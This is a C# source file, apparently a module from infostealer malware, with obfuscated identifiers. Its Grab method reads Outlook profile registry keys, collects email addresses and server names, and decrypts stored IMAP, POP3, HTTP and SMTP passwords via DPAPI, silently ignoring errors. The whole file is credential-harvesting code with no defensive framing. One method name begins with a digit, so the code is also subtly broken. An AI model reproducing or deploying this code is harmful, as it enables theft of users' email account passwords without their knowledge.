using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using C6Zy;
using Microsoft.Win32;
using reJu9lk2r;

namespace rk937aHHc
{
	public class Outlook : EtbH
	{
		public Outlook()
		{
			this.lXcr5QiZx0 = "Outlook";
		}

		public string lXcr5QiZx0 { get; set; }
        public List<WTitxI2m> Grab()
        {
            List<WTitxI2m> list = new List<WTitxI2m>();
            UTF8Encoding utf8Encoding = new UTF8Encoding();

            try
            {
                RegistryKey[] registryKeys = new RegistryKey[]
                {
                    Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676"),
                    Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676"),
                    Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"),
                    Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676")
                };

                foreach (RegistryKey registryKey in registryKeys)
                {
                    if (registryKey == null) continue;

                    foreach (string profileName in registryKey.GetSubKeyNames())
                    {
                        using (RegistryKey profileKey = registryKey.OpenSubKey(profileName))
                        {
                            try
                            {
                                if (profileKey.GetValue("Email") == null) continue;

                                string[] passwordKeys = new string[] { "IMAP Password", "POP3 Password", "HTTP Password", "SMTP Password" };
                                bool hasPassword = passwordKeys.Any(k => profileKey.GetValue(k) != null);
                                if (!hasPassword) continue;

                                WTitxI2m account = new WTitxI2m();

                                object emailValue = profileKey.GetValue("Email");
                                account.data2 = (emailValue is string)
                                    ? ((string)emailValue).TrimEnd('\0')
                                    : utf8Encoding.GetString((byte[])emailValue).TrimEnd('\0');

                                string passwordKeyUsed = null;
                                foreach (string key in passwordKeys)
                                {
                                    object passwordValue = profileKey.GetValue(key);
                                    if (passwordValue != null)
                                    {
                                        account.data3 = Outlook.9xKfS((byte[])passwordValue).TrimEnd('\0');
                                        passwordKeyUsed = key.Split(' ')[0]; // "IMAP", "POP3", "SMTP" 등
                                        break; // 첫 번째 존재하는 패스워드만 사용
                                    }
                                }

                                string serverKey = passwordKeyUsed + " Server";
                                object serverValue = profileKey.GetValue(serverKey);
                                account.data1 = (serverValue is string)
                                    ? ((string)serverValue).TrimEnd('\0')
                                    : utf8Encoding.GetString((byte[])serverValue).TrimEnd('\0');

                                account.data4 = this.lXcr5QiZx0;

                                list.Add(account);
                            }
                            catch
                            {
                            }
                        }
                    }
                }
            }
            catch
            {
            }

            return list;
        }
        private static string 9xKfS(byte[] encryptedData)
        {
            if (encryptedData == null || encryptedData.Length <= 1)
                return string.Empty;

            byte[] data = new byte[encryptedData.Length - 1];
            Buffer.BlockCopy(encryptedData, 1, data, 0, encryptedData.Length - 1);

            string decrypted = GHbU7Rc.ZDzD1h(data, DataProtectionScope.CurrentUser);

            return decrypted.Trim();
        }
    }
}
